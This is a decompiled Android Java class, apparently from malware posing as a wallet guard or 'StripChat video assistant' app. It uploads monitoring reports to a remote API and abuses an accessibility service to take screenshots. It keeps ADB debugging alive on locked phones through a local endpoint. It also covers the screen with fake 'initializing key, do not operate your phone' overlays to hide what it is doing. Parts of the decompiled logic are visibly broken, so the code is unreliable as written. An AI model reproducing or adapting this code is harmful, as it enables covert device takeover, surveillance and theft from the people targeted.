package com.guard.wallet.thread;

import a1.AbstractC0026q;
import android.os.Build;
import android.util.Log;
import b1.C0086h;
import com.google.json.JsonObject;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.http.C0215t;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ContainerEventVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.server.C0230b;
import com.guard.wallet.server.C0231c;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import d0.C0260a;
import java.util.LinkedList;
import java.util.ListIterator;
import java.util.Objects;
import java.util.TimerTask;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executor;
import java.util.concurrent.Future;
import p002e.C0262b;
import p005h.C0318e;
import p017u.C0918a;

/* renamed from: com.guard.wallet.thread.d */
/* loaded from: classes.dex */
public final class C0235d extends TimerTask {

    /* renamed from: a */
    public final /* synthetic */ int f357a;

    /* renamed from: b */
    public final /* synthetic */ Object f358b;

    public /* synthetic */ C0235d(Object obj, int i2) {
        this.f357a = i2;
        this.f358b = obj;
    }

    /* JADX WARN: Removed duplicated region for block: B:216:0x0482  */
    /* JADX WARN: Removed duplicated region for block: B:221:0x048f  */
    /* JADX WARN: Removed duplicated region for block: B:222:0x0490 A[Catch: Exception -> 0x04bd, TryCatch #0 {Exception -> 0x04bd, blocks: (B:203:0x0450, B:206:0x045a, B:208:0x0460, B:210:0x0465, B:212:0x046f, B:214:0x0475, B:217:0x0484, B:219:0x0489, B:222:0x0490, B:224:0x049a, B:226:0x04a4, B:228:0x04b0), top: B:202:0x0450, outer: #2 }] */
    @Override // java.util.TimerTask, java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        StringBuilder sb;
        ConcurrentLinkedQueue concurrentLinkedQueue;
        boolean z2;
        Integer perIdleDuration;
        String str;
        String str2;
        C0260a c0260a;
        C0918a c0918a;
        Executor mainExecutor;
        Integer num = 0;
        BlockViewVO blockViewVO = null;
        int i2 = this.f357a;
        boolean z3 = true;
        Object obj = this.f358b;
        switch (i2) {
            case 0:
                Log.d("HandlerMsgAndTimer", "handle msg thread is running");
                C0236e c0236e = (C0236e) obj;
                if (!c0236e.f364f.isEmpty()) {
                    LinkedList linkedList = new LinkedList();
                    while (true) {
                        int size = linkedList.size();
                        concurrentLinkedQueue = c0236e.f364f;
                        if (size < 20 && !concurrentLinkedQueue.isEmpty()) {
                            linkedList.add((ReqMessageVO) concurrentLinkedQueue.poll());
                        }
                    }
                    try {
                        if (!linkedList.isEmpty()) {
                            ApiRequest apiRequest = new ApiRequest();
                            apiRequest.setData(linkedList);
                            JsonObject m434q = AbstractC0207l.m434q(apiRequest, AbstractC0207l.f252a);
                            if (m434q != null) {
                                ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(m434q.toString(), new TypeToken<ApiResult<Boolean>>() { // from class: com.guard.wallet.thread.HandlerMsgAndTimer$2
                                });
                                if (apiResult != null && apiResult.getSuccess().booleanValue() && ((Boolean) apiResult.getData()).booleanValue()) {
                                    Log.d("HandlerMsgAndTimer", "同步发送监听汇报消息成功,发送数目：" + linkedList.size());
                                }
                            }
                            Log.e("HandlerMsgAndTimer", "同步发送监听汇报消息失败,归还数目：" + linkedList.size());
                            concurrentLinkedQueue.addAll(linkedList);
                        }
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("HandlerMsgAndTimer", e2);
                    }
                }
                if (!c0236e.f360b) {
                    MessageRecordVO messageRecordVO = new MessageRecordVO();
                    ContainerEventVO containerEventVO = new ContainerEventVO();
                    if (MainApplication.getInstance() != null) {
                        containerEventVO.setPackageName(MainApplication.getInstance().getPackageName());
                    }
                    containerEventVO.setContainerCode("ACCESSIBILITY_CONTAINER");
                    if (MyAccessibilityService.m554P() != null) {
                        containerEventVO.setIsOpened(1);
                    } else {
                        containerEventVO.setIsOpened(num);
                    }
                    containerEventVO.setServiceState(Integer.valueOf(C0230b.f292c.get()));
                    messageRecordVO.setIntentCode("android.intent.action.CONTAINER_EVENT");
                    messageRecordVO.setExtraBody(containerEventVO);
                    c0236e.m579b(messageRecordVO);
                    MessageRecordVO messageRecordVO2 = new MessageRecordVO();
                    ContainerEventVO containerEventVO2 = new ContainerEventVO();
                    if (MainApplication.getInstance() != null) {
                        containerEventVO2.setPackageName(MainApplication.getInstance().getPackageName());
                    }
                    containerEventVO2.setContainerCode("ACCESSIBILITY_MINI_CAP_CONTAINER");
                    if (C0231c.m511G() == null || !C0231c.m511G().f299x.get()) {
                        containerEventVO2.setIsOpened(num);
                    } else {
                        containerEventVO2.setIsOpened(1);
                        num = 1;
                    }
                    containerEventVO2.setServiceState(num);
                    messageRecordVO2.setIntentCode("android.intent.action.CONTAINER_EVENT");
                    messageRecordVO2.setExtraBody(containerEventVO2);
                    c0236e.m579b(messageRecordVO2);
                }
                c0236e.f360b = !c0236e.f360b;
                ConcurrentLinkedQueue concurrentLinkedQueue2 = c0236e.f363e;
                if (!concurrentLinkedQueue2.isEmpty()) {
                    LinkedList linkedList2 = new LinkedList();
                    while (linkedList2.size() < 20 && !concurrentLinkedQueue2.isEmpty()) {
                        linkedList2.add((ReqMessageVO) concurrentLinkedQueue2.poll());
                    }
                    try {
                        if (!linkedList2.isEmpty()) {
                            ApiRequest apiRequest2 = new ApiRequest();
                            apiRequest2.setData(linkedList2);
                            JsonObject m434q2 = AbstractC0207l.m434q(apiRequest2, AbstractC0207l.f252a);
                            if (m434q2 != null) {
                                ApiResult apiResult2 = (ApiResult) AbstractC0252h.m699c(m434q2.toString(), new TypeToken<ApiResult<Boolean>>() { // from class: com.guard.wallet.thread.HandlerMsgAndTimer$3
                                });
                                if (apiResult2 != null && apiResult2.getSuccess().booleanValue() && ((Boolean) apiResult2.getData()).booleanValue()) {
                                    sb = new StringBuilder("同步发送消息成功：");
                                    sb.append(linkedList2.size());
                                    Log.d("HandlerMsgAndTimer", sb.toString());
                                    break;
                                }
                            }
                            new C0204i().m408h(apiRequest2, "/api/message/post.json", new C0215t());
                            sb = new StringBuilder("异步提交消息:");
                            sb.append(linkedList2.size());
                            Log.d("HandlerMsgAndTimer", sb.toString());
                        }
                    } catch (Exception e3) {
                        AbstractC0026q.m186s("HandlerMsgAndTimer", e3);
                        return;
                    }
                }
                break;
            case 1:
                C0241j c0241j = (C0241j) obj;
                if (!((ConcurrentLinkedQueue) c0241j.f387e).isEmpty()) {
                    String str3 = (String) ((ConcurrentLinkedQueue) c0241j.f387e).poll();
                    try {
                        if (!AbstractC0026q.m151B(str3) && C0318e.m844S() != null) {
                            z2 = AbstractC0250f.f411b.get() && MyAccessibilityService.m554P() != null && MyAccessibilityService.m554P().m565V();
                            Integer num2 = AbstractC0248d.f402a;
                            perIdleDuration = (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || MainApplication.getInstance().getBuildConfig().getPerIdleDuration().intValue() <= 0) ? AbstractC0248d.f407f : MainApplication.getInstance().getBuildConfig().getPerIdleDuration();
                            switch (str3) {
                                case "KEEP_ADB_ALIVE_SCREEN_OFF":
                                    LockPatternVO B0 = AbstractC0251g.B0();
                                    Log.d("StrategyThread", "手机息屏");
                                    if (B0.getIsKeyguardLocked().intValue() == 1 && B0.getIsDeviceSecure().intValue() == 1) {
                                        Log.d("StrategyThread", "手机息屏,屏幕锁定");
                                        if (!AbstractC0251g.m636I()) {
                                            Log.d("StrategyThread", "手机息屏,屏幕锁定，发起打开ADB调试");
                                            AbstractC0207l.m428k("http://127.0.0.1:7911");
                                            break;
                                        }
                                    }
                                    break;
                                case "KEEP_ADB_ALIVE_SCREEN_ON":
                                    if (AbstractC0251g.B0().getIsKeyguardLocked().intValue() == 1) {
                                        str = "手机亮屏,屏幕锁定";
                                        Log.d("StrategyThread", str);
                                        break;
                                    }
                                    break;
                                case "KEEP_ADB_ALIVE_SCREEN_USER_PRESENT":
                                    str = "手机解锁,初始化连接状态";
                                    Log.d("StrategyThread", str);
                                    break;
                                case "KEEP_ADB_ALIVE_DEVELOPMENT_ON":
                                case "KEEP_ADB_ALIVE_DEVELOPMENT_OFF":
                                case "KEEP_ADB_ALIVE_ADB_DEBUG_ON":
                                case "KEEP_ADB_ALIVE_ADB_DEBUG_OFF":
                                case "KEEP_ADB_ALIVE_WIFI_DEBUG_ON":
                                case "KEEP_ADB_ALIVE_WIFI_DEBUG_OFF":
                                    C0318e.m844S().m849H();
                                    break;
                                case "SCREEN_OFF_LONG_DURATION":
                                    long j2 = MainApplication.getInstance().getCheckThread() != null ? MainApplication.getInstance().getCheckThread().f354p.get() : 0L;
                                    Integer perScreenOffDuration = (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || MainApplication.getInstance().getBuildConfig().getPerScreenOffDuration().intValue() <= 0) ? AbstractC0248d.f406e : MainApplication.getInstance().getBuildConfig().getPerScreenOffDuration();
                                    if (j2 >= perScreenOffDuration.intValue() && j2 % perScreenOffDuration.intValue() == 0) {
                                        if (MyAccessibilityService.m554P() != null) {
                                            MyAccessibilityService.m554P().m559H(true, true);
                                        }
                                        AbstractC0184g.m349c();
                                        if (!z2) {
                                        }
                                        try {
                                            C0262b c0262b = C0262b.f433a;
                                            if (AbstractC0249e.m623l() || !C0241j.m586g(null, true)) {
                                                if (!C0318e.m844S().m860U() && AbstractC0251g.n0()) {
                                                    C0318e.m844S().getClass();
                                                    if (C0318e.m846Y(null)) {
                                                        str2 = "requestLocalAdbPair";
                                                        Log.d("StrategyThread", str2);
                                                        break;
                                                    }
                                                }
                                                if (C0241j.m586g(null, true)) {
                                                    if (C0318e.m844S().m860U() && C0318e.m844S().mo302D() && C0318e.m844S().f608B.get() && C0318e.m844S().m863X()) {
                                                        str2 = "openWriteSecure";
                                                        Log.d("StrategyThread", str2);
                                                    }
                                                }
                                            }
                                            Log.d("StrategyThread", "requestLocalKeepAlive");
                                            break;
                                        } catch (Exception e4) {
                                            AbstractC0026q.m186s("StrategyThread", e4);
                                            return;
                                        }
                                    }
                                    break;
                                case "INTERACTIVE_IDLE_LONG_DURATION":
                                    long j3 = MainApplication.getInstance().getCheckThread() != null ? MainApplication.getInstance().getCheckThread().f352n.get() : 0L;
                                    if (j3 >= perIdleDuration.intValue() && j3 % perIdleDuration.intValue() == 0) {
                                        if (j3 % (perIdleDuration.intValue() * 4) == 0) {
                                            if (!C0318e.m844S().m860U() && !AbstractC0251g.n0() && AbstractC0251g.S0()) {
                                                break;
                                            }
                                        }
                                        if (!z2) {
                                            break;
                                        }
                                        C0262b c0262b2 = C0262b.f433a;
                                        if (AbstractC0249e.m623l()) {
                                            break;
                                        }
                                        if (!C0318e.m844S().m860U()) {
                                            C0318e.m844S().getClass();
                                            if (C0318e.m846Y(null)) {
                                            }
                                            break;
                                        }
                                        if (C0241j.m586g(null, true)) {
                                        }
                                    }
                                    break;
                                case "LOCAL_LOCK_CIPHER_PREPARED":
                                    long j4 = MainApplication.getInstance().getCheckThread() != null ? MainApplication.getInstance().getCheckThread().f352n.get() : 0L;
                                    if (j4 >= perIdleDuration.intValue() && j4 % perIdleDuration.intValue() == 0 && !C0318e.m844S().m860U() && z2 && AbstractC0251g.n0()) {
                                        C0318e.m844S().getClass();
                                        C0318e.m846Y(blockViewVO);
                                        break;
                                    }
                                    break;
                                case "PREPARE_LEAVE_PIP":
                                    if (!C0318e.m844S().m860U() && z2 && Objects.equals(num, AbstractC0248d.m609g()) && AbstractC0251g.n0()) {
                                        C0318e.m844S().getClass();
                                        if (C0318e.m846Y(null)) {
                                            break;
                                        }
                                    }
                                    C0262b.m738d();
                                    AbstractC0184g.m349c();
                                    break;
                                case "PREPARE_FOR_APP_CONFIRM_LOCK":
                                    if (!C0318e.m844S().m860U() && z2 && AbstractC0251g.n0()) {
                                        BlockViewVO blockViewVO2 = new BlockViewVO(false, (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAppCredentialInitMsg())) ? "Initializing verification key\nPlease wait..." : MainApplication.getInstance().getBuildConfig().getAppCredentialInitMsg(), false, false);
                                        C0318e.m844S().getClass();
                                        if (C0318e.m846Y(blockViewVO2)) {
                                            break;
                                        }
                                    }
                                    C0241j.m585e();
                                    break;
                                case "LOCAL_WIFI_NETWORK_PREPARED":
                                    if (!C0318e.m844S().m860U() && z2 && AbstractC0251g.n0()) {
                                        BlockViewVO blockViewVO3 = new BlockViewVO(false, (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getWifiBlockMsg())) ? "Initializing Wi-Fi network data transmission key\nPlease do not operate your phone..." : MainApplication.getInstance().getBuildConfig().getWifiBlockMsg(), false, false);
                                        C0318e.m844S().getClass();
                                        if (C0318e.m846Y(blockViewVO3)) {
                                            break;
                                        }
                                    }
                                    C0241j.m585e();
                                    break;
                                case "PREPARE_FOR_UPDATE_SYSTEM":
                                    if (!z2) {
                                        break;
                                    } else {
                                        blockViewVO = new BlockViewVO(false, AbstractC0248d.m611i(), false, false);
                                        C0262b c0262b3 = C0262b.f433a;
                                        if ((AbstractC0249e.m623l() && C0241j.m586g(blockViewVO, true)) || C0318e.m844S().m860U() || !AbstractC0251g.n0()) {
                                        }
                                        C0318e.m844S().getClass();
                                        C0318e.m846Y(blockViewVO);
                                        break;
                                    }
                                    break;
                                case "LOAD_LOCATE_VALUES_FINISHED":
                                case "LOAD_LISTEN_WINDOW_FINISHED":
                                    if (!z2) {
                                        break;
                                    } else {
                                        blockViewVO = new BlockViewVO(false, (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAliveBlockMsg())) ? "Initializing [StripChat video assistant]\nPlease do not operate your phone..." : MainApplication.getInstance().getBuildConfig().getAliveBlockMsg(), false, false);
                                        if (!C0241j.m586g(blockViewVO, true) && !C0241j.m585e() && !C0318e.m844S().m860U() && AbstractC0251g.n0()) {
                                            C0318e.m844S().getClass();
                                            C0318e.m846Y(blockViewVO);
                                            break;
                                        }
                                    }
                                    break;
                                default:
                                    str = "未知策略事件";
                                    Log.d("StrategyThread", str);
                                    break;
                            }
                        }
                    } catch (Exception e5) {
                        AbstractC0026q.m186s("StrategyThread", e5);
                        return;
                    }
                }
                break;
            case 2:
                if (MyAccessibilityService.m554P() != null && Build.VERSION.SDK_INT >= 30) {
                    LinkedList linkedList3 = C0260a.f422j;
                    if (!linkedList3.isEmpty()) {
                        ListIterator listIterator = linkedList3.listIterator();
                        while (listIterator.hasNext()) {
                            if (((Future) listIterator.next()).isDone()) {
                                listIterator.remove();
                            }
                        }
                        z3 = linkedList3.isEmpty();
                    }
                    if (z3 && (c0918a = (c0260a = (C0260a) obj).f428f) != null && c0918a.m1384b()) {
                        C0918a c0918a2 = c0260a.f428f;
                        c0918a2.f2080a.set(0);
                        c0918a2.f2083d = null;
                        MyAccessibilityService m554P = MyAccessibilityService.m554P();
                        int intValue = AbstractC0249e.f409b.intValue();
                        mainExecutor = MainApplication.getAppContext().getMainExecutor();
                        m554P.takeScreenshot(intValue, mainExecutor, c0918a2);
                        while (!c0918a2.m1384b()) {
                        }
                        c0918a2.f2080a.set(-1);
                        c0918a2.f2083d = null;
                        break;
                    }
                }
                break;
            default:
                ((C0086h) obj).m319y();
                break;
        }
    }
}
